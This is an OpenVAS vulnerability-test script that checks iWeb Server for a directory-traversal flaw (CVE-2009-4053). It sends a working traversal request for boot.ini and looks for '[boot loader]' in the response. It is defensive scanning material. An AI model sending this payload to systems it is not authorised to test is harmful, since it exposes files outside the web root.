###############################################################################
# OpenVAS Vulnerability Test
# $Id: iWeb_37228.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# iWeb Server URL Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "iWeb Server is prone to a directory-traversal vulnerability because
the application fails to sufficiently sanitize user-supplied input.

Exploiting this issue allows an attacker to access files outside of
the web servers root directory. Successfully exploiting this issue
will allow attackers to gain access to sensitive information.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100378");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-12-08 12:57:07 +0100 (Tue, 08 Dec 2009)");
 script_bugtraq_id(37228);
 script_cve_id("CVE-2009-4053");
 script_tag(name:"cvss_base", value:"4.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:P/A:N");

 script_name("iWeb Server URL Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37228");
 script_xref(name : "URL" , value : "http://www.ashleybrown.co.uk/iweb/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("iWeb/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner)exit(0);

if(egrep(pattern:"Server: iWeb", string:banner))
 {
   url = string("/..%5C..%5C..%5Cboot.ini");
   req = http_get(item:url, port:port);
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if( res == NULL )exit(0);

   if( egrep(pattern: "\[boot loader\]", string: res, icase: TRUE) ) {
        security_message(port:port);
        exit(0); 
   }
 }

exit(0);
